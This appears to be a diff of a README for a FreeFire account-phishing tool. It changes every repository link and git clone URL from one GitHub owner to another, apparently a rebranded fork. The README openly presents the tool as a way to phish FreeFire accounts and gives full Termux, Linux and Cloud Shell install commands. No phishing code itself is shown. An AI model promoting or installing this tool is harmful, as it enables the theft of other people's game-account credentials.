@@ -3,14 +3,14 @@
   FreeFire ID Hack Use Termux
 </p>
 <p align="center">
-<a href="https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html.html"><img title="Made in INDIA" src="https://img.shields.io/badge/MADE%20IN-INDIA-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
+<a href="blackhatnicki/FreeFire-Phishing-Hack-Termux.html.html"><img title="Made in INDIA" src="https://img.shields.io/badge/MADE%20IN-INDIA-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
 </p>
 
 </p>
 <p align="center">
-<a href="https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html.html"><img title="Made in INDIA" src="https://img.shields.io/badge/Tool-FREEFIRE_PHISHING-green.svg"></a>
-<a href="https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html.html"><img title="Version" src="https://img.shields.io/badge/Version-2.4-green.svg?style=flat-square"></a>
-<a href="https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html.html"><img title="Maintainence" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>
+<a href="blackhatnicki/FreeFire-Phishing-Hack-Termux.html.html"><img title="Made in INDIA" src="https://img.shields.io/badge/Tool-FREEFIRE_PHISHING-green.svg"></a>
+<a href="blackhatnicki/FreeFire-Phishing-Hack-Termux.html.html"><img title="Version" src="https://img.shields.io/badge/Version-2.4-green.svg?style=flat-square"></a>
+<a href="blackhatnicki/FreeFire-Phishing-Hack-Termux.html.html"><img title="Maintainence" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>
 </p>
 
 <p align="center">
@@ -72,7 +72,7 @@ FREEFIRE-PHISING IS A PHISING TOOL WICH IS USED TO PHISH A FREEFIRE ACCOUNT OF Y
 
 ## ✅ INSTALLATION [ All Systems ] :
 
-# <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/OnlineHacKing/FreeFire-Phishing&tutorial=README.md)
+# <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/blackhatnicki/FreeFire-Phishing&tutorial=README.md)
 
 
 
@@ -84,7 +84,7 @@ pkg upgrade -y
 
 pkg install git 
 
-git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git
+git clone https://github.com/blackhatnicki/FreeFire-Phishing.git
 
 cd FreeFire-Phishing
 
@@ -104,7 +104,7 @@ sudo apt upgrade -y
 
 sudo apt install git 
 
-git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git
+git clone https://github.com/blackhatnicki/FreeFire-Phishing.git
 
 cd FreeFire-Phishing
 
@@ -117,7 +117,7 @@ chmod +x *
 
 ## ✅ INSTALLATION [ Windows ] :
 
-# <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/OnlineHacKing/FreeFire-Phishing&tutorial=README.md)
+# <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/blackhatnicki/FreeFire-Phishing&tutorial=README.md)
 
 
 ### 📸 SCREENSHOTS [Termux]
